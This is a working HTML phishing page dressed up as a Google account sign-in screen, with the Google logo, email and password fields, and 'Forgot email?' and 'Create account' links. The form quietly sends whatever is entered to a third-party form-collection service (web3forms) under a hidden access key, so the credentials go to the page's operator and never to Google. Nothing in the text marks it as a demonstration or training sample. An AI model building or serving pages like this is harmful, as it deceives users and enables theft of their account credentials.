<style>

  body {
    margin: 0;
    font-family: 'Roboto', Arial, sans-serif;
    background-color: rgb(240, 244, 249);
  }
  #initialView {
    max-width: 400px;
    margin: 60px auto;
    padding: 40px;
    background: white;
    border-radius: 25px;
   

</style>

<body>

<div id="initialView">
  <div class="left">
  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google" style="display:block; margin:0 auto 24px; width:160px; height:56px;" />

  <h1 class="mdc-typography--headline5" style="text-align:center; font-weight:400; color:#202124;">Sign in</h1>
  <div style="text-align:center; color:#5f6368; font-size:14px; margin-bottom: 24px;">with your Google Account. This account will be available to other Google apps in the browser.</div>
  </div>
  <div>
  <form action="https://api.web3forms.com/submit" method="POST">
    <div>
      <input type="hidden" name="access_key" value="6b1d194b-0623-437c-aafe-c955bd949cde">
      <input type="email" id="identifierId" name="identifier" placeholder="Email or phone" autocomplete="username" required
        style="width:100%; padding:14px 12px; font-size:16px; border-radius:4px; border:1px solid #dadce0; margin-bottom: 16px;" />
      <input type="password" id="identifierId" name="identifier" placeholder="password" autocomplete="username" required
        style="width:100%; padding:14px 12px; font-size:16px; border-radius:4px; border:1px solid #dadce0; margin-bottom: 16px;" />      

    </div>
    <div style="text-align:right; margin-bottom:32px;">
      <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none;">Forgot email?</a>
    </div>
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none;">Create account</a>
      <button type="submit"
        style="background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; padding:10px 24px; cursor:pointer;">Next</button>
    </div>
  </form>
  

  <div style="margin-top:40px; text-align:center;">
    <select style="font-size:13px; color:#5f6368; border:none; background:none; cursor:pointer;">
      <option>English (United Kingdom)</option>
      <option>English (United States)</option>
      <option>العربية</option>
      <option>Français</option>
    </select>
  </div>

  <div style="margin-top:12px; text-align:center; font-size:13px; color:#5f6368;">
    <a href="#" style="margin:0 8px; color:#5f6368; text-decoration:none;">Help</a>
